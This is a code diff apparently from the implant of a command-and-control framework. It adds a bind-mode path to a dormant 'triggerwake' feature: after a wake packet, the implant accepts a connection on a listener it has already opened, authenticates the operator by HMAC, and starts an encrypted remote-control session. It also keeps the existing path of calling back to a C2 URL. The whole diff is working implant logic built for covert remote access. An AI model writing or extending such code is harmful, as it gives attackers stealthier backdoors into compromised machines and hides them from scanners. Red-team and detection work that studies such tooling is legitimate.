@@ -147,29 +147,57 @@ func Main() {
 		// {{end}}
 		wakeInfo := <-transports.WakeChannel()
 		// {{if .Config.Debug}}
-		log.Printf("[triggerwake] wake received (transport=%q callback=%q), proceeding to C2 startup", wakeInfo.TransportHint, wakeInfo.CallbackURL)
+		log.Printf("[triggerwake] wake received (bind=%v transport=%q callback=%q)", wakeInfo.BindMode, wakeInfo.TransportHint, wakeInfo.CallbackURL)
 		// {{end}}
-
-		// Apply transport preference from the wake packet.
-		transports.SetPreferredTransport(wakeInfo.TransportHint)
 
 		// Reset connection errors so previous session failures don't
 		// prevent the new session from connecting.
 		connectionErrors = 0
 
-		// {{if .Config.IsBeacon}}
-		if wakeInfo.CallbackURL != "" {
-			beaconStartupWithCallback(wakeInfo.CallbackURL)
+		if wakeInfo.BindMode && wakeInfo.BindListener != nil {
+			// Bind session path: accept a connection on the
+			// already-opened listener, perform HMAC auth handshake,
+			// establish encrypted channel, negotiate yamux, and run
+			// the standard session loop.
+			// {{if .Config.Debug}}
+			log.Printf("[triggerwake] bind session: accepting on %s", wakeInfo.BindListener.Addr())
+			// {{end}}
+			connection, err := transports.BindSessionConnect(wakeInfo.BindListener, wakeInfo.BindSecret)
+			if connection != nil && err == nil {
+				if startErr := connection.Start(); startErr == nil {
+					err = sessionMainLoop(connection)
+					if err == ErrTerminate {
+						connection.Cleanup()
+						return
+					}
+				}
+				connection.Cleanup()
+			} else {
+				// BindSessionConnect returned nil — auth failed
+				// (scanner) or TTL expired. Loop back to dormant.
+				// {{if .Config.Debug}}
+				log.Printf("[triggerwake] bind session: no session established (auth failed or TTL expired): %v", err)
+				// {{end}}
+			}
 		} else {
-			beaconStartup()
+			// Callback session path (original behavior).
+			// Apply transport preference from the wake packet.
+			transports.SetPreferredTransport(wakeInfo.TransportHint)
+
+			// {{if .Config.IsBeacon}}
+			if wakeInfo.CallbackURL != "" {
+				beaconStartupWithCallback(wakeInfo.CallbackURL)
+			} else {
+				beaconStartup()
+			}
+			// {{else}} ------- IsBeacon/IsSession -------
+			if wakeInfo.CallbackURL != "" {
+				sessionStartupWithCallback(wakeInfo.CallbackURL)
+			} else {
+				sessionStartup()
+			}
+			// {{end}}
 		}
-		// {{else}} ------- IsBeacon/IsSession -------
-		if wakeInfo.CallbackURL != "" {
-			sessionStartupWithCallback(wakeInfo.CallbackURL)
-		} else {
-			sessionStartup()
-		}
-		// {{end}}
 
 		// Session/beacon returned -- clear the transport preference
 		// so the next wake can specify a fresh one.
